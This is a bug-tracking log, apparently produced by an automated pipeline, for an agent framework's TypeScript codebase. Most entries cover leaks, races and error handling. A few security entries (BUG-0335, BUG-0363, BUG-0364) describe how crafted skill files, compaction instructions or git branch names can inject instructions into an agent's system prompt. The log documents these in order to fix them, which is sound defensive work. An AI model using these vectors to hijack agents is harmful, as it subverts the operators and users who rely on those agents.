- **description:** callTool casts response.result (typed unknown) directly to MCPCallToolResult with no structural validation, so a malformed MCP server response causes a runtime crash when callers destructure the result.
- **context:** Any MCP server returning a non-conforming result object will cause downstream crashes. The same unsafe cast pattern exists at line 121 for MCPInitializeResult.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Validate MCP server response structure before casting at callTool and initialize.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0326
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `57`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0326`
- **description:** Redis v4 fallback path assigns raw createClient result as RedisClient without a shim, but RedisClient.del uses rest params while redis v4 del expects an array — multi-key deletes on v4 backend will break.
- **context:** The ioredis path correctly shims del with r.del(...keys), but the redis v4 branch has no such adapter.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Add del shim for redis v4 multi-key compatibility.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0328
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/stripe/index.ts`
- **line:** `59`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0328`
- **description:** loadStripeInstance creates a new Stripe SDK client on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** In long-running agent sessions with many Stripe tool calls, file descriptors grow without bound, eventually causing EMFILE or connection pool exhaustion.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Cache Stripe SDK client instance keyed by API key to prevent connection pool leak.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0329
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/slack/index.ts`
- **line:** `40`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0329`
- **description:** loadSlackClient creates a new WebClient on every tool invocation instead of caching, accumulating HTTP agent connection pools and socket handles over the session lifetime.
- **context:** Same pattern as BUG-0328 but for Slack — per-call client creation causes socket handle growth in long-running sessions.
- **hunter_found:** `2026-03-20T22:12:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Cache Slack WebClient instance keyed by token to prevent connection pool leak.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0330
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/coordination/request-reply.ts`
- **line:** `78`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0330`
- **description:** Timeout callback and `reply()` method both check-then-mutate `req.resolved` non-atomically — if timeout fires between `reply()` capturing the resolver and setting `resolved = true`, both the rejection and resolution fire on the same Promise.
- **context:** Double-settling a Promise is silently ignored by V8, but downstream `.then()` chains may observe the resolved value after the rejection handler already ran, causing inconsistent state in request-reply coordination patterns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Make resolved flag check-and-set atomic in reply() to prevent double-settlement.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0331
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/store/index.ts`
- **line:** `126`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0331`
- **description:** `InMemoryStore.put()` checks `this.data.size` against `maxItems` before an `await this.embedFn()` call, then inserts after the await — concurrent `put()` calls all pass the size check before any insert, exceeding the capacity limit.
- **context:** In high-throughput agent loops that write to the store concurrently, the maxItems invariant is silently violated, causing unbounded memory growth in what is supposed to be a bounded store.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:20:00Z`
- **fixer_completed:** `2026-03-21T04:20:00Z`
- **fix_summary:** `Add post-insert capacity re-check in InMemoryStore.put() to prevent exceeding maxItems.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0332
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/checkpointers/redis.ts`
- **line:** `155`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0332`
- **description:** `delete()` reads steps via `zrange` then issues separate `del` calls for each data key and the index key — a concurrent `put()` between the zrange and del leaves an orphaned data key with no index entry pointing to it.
- **context:** Orphaned keys accumulate in Redis over time, consuming memory that is never reclaimed. Related to but distinct from BUG-0304 (non-atomic `get()`).
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Delete index key and data keys in single atomic del() call to prevent orphaned entries.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0333
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/json.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0333`
- **description:** `readFile(source, "utf-8")` is called without any try/catch, so filesystem errors (ENOENT, EACCES) propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) but in the JSON loader. The CSV loader correctly wraps readFile in try/catch with a descriptive message, but the JSON loader does not.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Wrap readFile in try-catch with descriptive JsonLoader error message.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0334
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/cli/init.ts`
- **line:** `11`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0334`
- **description:** `initProject()` calls `mkdir` and five `writeFile` operations with no try/catch — filesystem errors (permission denied, disk full) propagate as unhandled rejections with raw Node.js errors instead of user-friendly CLI messages.
- **context:** Unlike other CLI commands (build, inspect) which wrap I/O in try/catch, `init` crashes with an unformatted stack trace on any filesystem error.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Wrap initProject I-O in try-catch with user-friendly CLI error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0335
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/context-compactor.ts`
- **line:** `279`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0335`
- **description:** Caller-supplied `compactInstructions` is injected verbatim into the LLM summarization prompt with no sanitization, enabling prompt injection that can manipulate context compaction output.
- **context:** An attacker who can influence harness configuration can inject instructions to exfiltrate conversation history or corrupt the compacted context fed into subsequent agent turns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `XML-escape and fence compactInstructions before injection into LLM prompt.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0336
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/cli/run.ts`
- **line:** `33`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0336`
- **description:** User-supplied file path from CLI arguments is passed directly to `spawn("npx", ["tsx", entryFile])` with no extension validation or cwd containment check, allowing execution of arbitrary files on the filesystem.
- **context:** Unlike `cli/inspect.ts` which enforces ALLOWED_EXTENSIONS and cwd containment, `run.ts` does neither.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Add extension validation and cwd containment check for CLI entry file.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0337
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/models/http-error.ts`
- **line:** `72`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0337`
- **description:** Full upstream API error body from model providers is reflected verbatim into thrown `ModelAPIError` with no truncation or field scrubbing, potentially leaking provider-side internal details and request IDs to callers.
- **context:** If these errors propagate to HTTP responses, log sinks, or LLM context, internal provider error details are exposed.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Added sanitizeErrorBody() to scrub sensitive fields and truncate to 500 chars in ModelAPIError.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0339
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `27`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0339`
- **description:** The `state` getter has a side effect — it mutates `this._state` from `"open"` to `"half_open"` when the reset timeout has elapsed, meaning any code that reads `state` twice can non-deterministically advance the circuit state.
- **context:** Logging, test assertions, or monitoring code that reads `state` can inadvertently trigger state transitions. State mutations should happen in `execute()`, not in a property accessor.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Moved open-to-half_open transition from state getter to execute(). Getter is now pure accessor.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0340
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `34`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0339`
- **description:** In half_open state, the `_probeInFlight` guard between reading state and setting the flag is not atomic — two concurrent `execute()` calls can both pass the guard and both run the probe function simultaneously, violating the single-probe invariant.
- **context:** The circuit breaker is designed to allow exactly one probe request in half_open state. Concurrent probes can cause inconsistent failure counting and incorrect state transitions.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Made probe guard atomic: check-and-set _probeInFlight synchronously before async call. Same commit as BUG-0339.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/circuit-breaker-half-open-single-probe.test.ts`

---

### BUG-0342
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/memory/scanner.ts`
- **line:** `164`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0342`
- **description:** `scanDirectory` skips all files named `"INDEX.md"` at every level, but `inferTierFromPath` explicitly handles `semantic/topics/INDEX.md` as tier 2 — the scanner and tier inferrer are inconsistent, so INDEX.md memory units are never registered.
- **context:** Tier-2 semantic topic indexes are silently missing from the memory loader's unit map, making semantic memory queries incomplete.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Scanner fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0343
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/harness/safety-gate.ts`
- **line:** `86`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0343-0344`
- **description:** When `responsePromise` rejects before the timeout fires, the catch block returns `FALLBACK_RESULT` without calling `clearTimeout(timeoutHandle)`, leaving a dangling timer.
- **context:** Same uncleaned timeout pattern as BUG-0031 (inference.ts) and BUG-0018 (experimental-executor.ts).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Safety gate fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0344
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/csv.ts`
- **line:** `17`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0344`
- **description:** TSV detection uses `source.endsWith(".tsv")` on the raw path, but `supports()` lowercases the extension — a file with `.TSV` extension passes `supports()` but gets parsed with comma separator instead of tab.
- **context:** TSV files with uppercase extensions are silently parsed as CSV, producing garbled data with tab characters embedded in field values.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Changed source.endsWith(.tsv) to source.toLowerCase().endsWith(.tsv) for case-insensitive TSV detection.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0345
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/markdown.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0345`
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) and BUG-0333 (json.ts). The CSV loader correctly wraps readFile but markdown does not.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Wrap readFile in try-catch with descriptive MarkdownLoader error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0346
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/html.ts`
- **line:** `17`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0346`
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same missing-error-handling pattern as BUG-0270 (pdf), BUG-0333 (json), BUG-0345 (markdown).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `HTML loader fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0347
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `77`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0347`
- **description:** `ensureSchema()` runs CREATE TABLE and CREATE INDEX as separate un-transacted queries — a failure between the two leaves the schema in a partial state with a table but no index.
- **context:** On flaky network connections to Postgres, the store can end up with a table but no index, causing slow queries on `listNamespaces` and `search`.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Wrap ensureSchema CREATE TABLE and CREATE INDEX in BEGIN-COMMIT transaction with ROLLBACK on error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0348
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/harness/loop/tools.ts`
- **line:** `118`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** A local `stripProtoKeys` function declared inside the `modifiedInput` block shadows the module-level `stripProtoKeys` — the two implementations have subtly different behavior for array handling, and the shadowing is almost certainly unintentional.
- **context:** Maintenance changes to one copy will not propagate to the other, creating a divergence hazard. The outer function handles arrays differently than the inner one.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. No stripProtoKeys function exists anywhere in src/harness/loop/tools.ts or the codebase. Code pattern described in bug does not exist. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0350
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/self-improvement/skill-evolver.ts`
- **line:** `86`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0350`
- **description:** `recordSkillUsage` calls `splice(0, ...)` on `this.usageHistory` while `identifyWeakSkills` or `proposeSkillImprovement` may be concurrently iterating the same array.
- **context:** If `proposeSkillImprovement` (which filters `this.usageHistory`) is awaited concurrently with `recordSkillUsage` triggering splice-based eviction, the `filter` call can observe a truncated or shifted array, producing an incorrect failure list passed to the LLM.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Replace splice with slice reassignment in recordSkillUsage to prevent concurrent iteration race.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0351
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/streaming.ts`
- **line:** `296`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0351`
- **description:** Subgraph streaming hard-codes `childStreamMode: ["debug", "values"]`, ignoring the parent's actual requested stream modes and never collecting `"custom"` or `"messages"` events.
- **context:** If the parent only requested `"updates"`, the child still runs in `["debug", "values"]` mode, generating irrelevant events. More critically, `"custom"` and `"messages"` events emitted inside a subgraph are never surfaced because `modeCustom` and `modeMessages` checks on `allSubgraphEvents` always yield nothing.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Subgraph stream fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0352
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/swarm/factories.ts`
- **line:** `743`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `buildDag` directly mutates private `(swarm.inner as any).edges = []` to rewire graph topology after `addAgent`, but does not clear other internal state (`conditionalEdges`, `pathMaps`) that `addAgent` may have registered.
- **context:** Clearing only `edges` leaves dangling references in other internal structures that can cause `NodeNotFoundError` or silently skip nodes during execution. The same pattern at line 854 in `buildPool` has the same risk.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. StateGraph has no separate conditionalEdges or pathMaps fields — all edge types are stored in the single edges[] array, which IS cleared. addAgent() only adds nodes, not edges. The edges=[] clearing is correct. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0353
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `26`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0353`
- **description:** `HITLSessionStore` uses lazy eviction with no background timer, allowing resumed sessions past their TTL to accumulate in the `sessions` Map indefinitely if no new operations trigger `evict()`.
- **context:** The `evict()` method is only called from `record()`, `get()`, `getByThread()`, and `pendingCount()` — not from `all()` or `markResumed()`. In a long-lived process where sessions are created and marked resumed but no further HITL operations arrive, the map grows without bound.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Resume fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0354
- **status:** `blocked`
- **severity:** `low`
- **file:** `src/swarm/pool.ts`
- **line:** `208`
- **category:** `dead-code`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `if (!total) return null` guard in `pickSlot()` round-robin case is unreachable because `available.length` was already verified non-empty on line 201.
- **context:** The early return on line 201 (`if (!available.length) return null`) guarantees `total` is always >= 1 when the round-robin case is reached, making the `!total` check dead code.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. The dead code guard does not exist in current codebase. pickSlot() has no unreachable if (!total) check.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0355
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `191`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0355`
- **description:** Three `void this.client.zrem()` calls in `list()` fire Redis cleanup operations as floating promises with no error handling.
- **context:** When a data key has expired or is corrupt, stale sorted-set index entries are pruned via fire-and-forget `zrem`. If Redis connection is interrupted, the error is swallowed and phantom keys persist in `list()` results on every subsequent call.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Add .catch() error handling to fire-and-forget Redis cleanup operations in get() and list().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0356
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `185`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0356`
- **description:** Bulk expired-row cleanup in `PostgresStore.list()` uses `void this.client.query()` with no error handling.
- **context:** When `list()` finds expired rows it fires a DELETE query as a floating promise. If the DELETE fails, the error is silently lost and expired rows accumulate, affecting subsequent `list()` and `search()` calls.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Postgres cleanup error handling.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0357
- **status:** `fixed`
- **severity:** `low`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `125`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0357`
- **description:** Single expired-row cleanup in `PostgresStore.get()` uses `void this.client.query()` with no error handling.
- **context:** When `get()` detects an expired row it fires a DELETE as a floating promise. The caller still gets `null` so behavior is correct, but the expired row is never deleted and re-triggers the same silent failure on every subsequent `get()`.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Postgres TTL fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0359
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/loop/index.ts`
- **line:** `156`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0359`
- **description:** Off-by-one in turns-remaining calculation tells the model "0 turns remaining" on its last valid turn instead of 1.
- **context:** `remaining = maxTurns - turn - 1` evaluates to 0 when `turn = maxTurns - 1`, but the agent is still executing that turn. The correct formula is `maxTurns - turn`. This causes the agent to believe it has no turns left while it is still active.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Changed remaining turns from maxTurns-turn-1 to maxTurns-turn to fix off-by-one.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0360
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/execution.ts`
- **line:** `98`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0360`
- **description:** PII redaction silently bypasses audit log and `filter.blocked` event emission because `runFilters` returns `passed: true` for redacted content.
- **context:** The `if (!inputCheck.passed)` guard controls both event bus emission and audit logging. When a PII filter redacts content instead of blocking it, `passed: true` is returned, so no audit record is written and no `filter.blocked` event fires, even though content was silently modified.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Added filter.redacted event and audit entry when PII filter redacts content without blocking.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0362
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/events/bridge.ts`
- **line:** `32`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0362`
- **description:** `startTimes` Map in `bridgeSwarmTracer` can be cleared by `unsubscribe()` while subscriber callbacks are still firing, producing incorrect `durationMs: 0` values.
- **context:** If `unsubscribe()` is called during swarm teardown while events are still being dispatched, `startTimes.clear()` at line 81 clears entries that a concurrently-firing `agent_complete` callback still needs, silently producing 0-duration metrics.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Removed startTimes.clear() from unsubscribe() to prevent race with in-flight callbacks.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0363
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/harness/skill-loader.ts`
- **line:** `269`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0363`
- **description:** `skill.content` from SKILL.md files is injected raw into the XML `<skill-instructions>` wrapper without XML-escaping, enabling prompt injection via crafted skill files.
- **context:** A SKILL.md file containing `</skill-instructions>` in its body breaks the XML fence and injects arbitrary content into the agent's system prompt. If skill files can be sourced from untrusted paths (e.g. community plugins), this is a direct prompt injection vector. OWASP A03:2021 - Injection.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** `2026-03-21T03:43:00Z`
- **fix_summary:** `Added private escapeXml() method to SkillLoader in src/harness/skill-loader.ts. All three user-controlled strings (skill.content, name, args) are now XML-escaped before interpolation into the <skill-instructions> wrapper, preventing XML fence breakout.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/skill-loader-content-xml-escape.test.ts`

---

### BUG-0364
- **status:** `fixed`
- **severity:** `high`
- **file:** `src/harness/loop/index.ts`
- **line:** `160`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0364`
- **description:** `config.env` values (cwd, gitBranch, gitStatus) are interpolated unsanitized into the agent system prompt, enabling prompt injection via crafted git branch names.
- **context:** A malicious git branch name containing newlines and prompt-injection payloads (e.g. from a cloned repository) breaks out of the `<env>` XML block and injects arbitrary instructions into the LLM's system prompt, compromising agent behavior. OWASP A03:2021 - Injection.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** `2026-03-21T03:43:00Z`
- **fix_summary:** `Added sanitizeEnvValue() helper in src/harness/loop/index.ts that strips control characters (including newlines) and XML-escapes <, >, & before env values are interpolated into the system prompt. All 5 env values (cwd, platform, date, gitBranch, gitStatus) now sanitized.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/harness-loop-env-sanitize.test.ts`

---

### BUG-0365
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/client/index.ts`
- **line:** `94`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0365`
- **description:** `streamTask()` while-loop has no read timeout — a stalled server that never closes the stream causes the generator to hang forever, leaking the HTTP connection and reader lock.
- **context:** The `AbortSignal` timeout configured at construction applies only to the initial fetch, not to subsequent reads. A remote A2A server that stops sending data but does not close the connection holds the `ReadableStreamDefaultReader` lock and TCP connection indefinitely.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Added per-read timeout to streamTask() while-loop to prevent hanging on stalled servers.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0366
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/memory/index.ts`
- **line:** `523`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0366`
- **description:** `hydrate()` mutates the shared `MemoryUnit` object's `content` field in-place, so concurrent agents sharing the same `MemoryLoader` instance overwrite each other's hydrated content.
- **context:** `MemoryLoader` has no fork mechanism and is passed directly to multiple concurrent `agentLoop` calls. Two agents calling `hydrate()` on the same unit simultaneously produce a data race on `unit.content`.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Memory index fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---


### BUG-0370
- **status:** `pending`
- **severity:** `high`
- **file:** `src/pregel/streaming.ts`
- **line:** `117`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Fan-out sends execute in parallel via Promise.allSettled sharing the same pre-superstep state snapshot; concurrent sends writing the same last-write-wins channel key lose all but the last writer's update.
- **context:** In a fan-out with N sends targeting the same channel keys using last-write-wins reducers, sends 1..N-1's writes are silently dropped because each applyUpdate starts from the same baseline state rather than accumulating.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
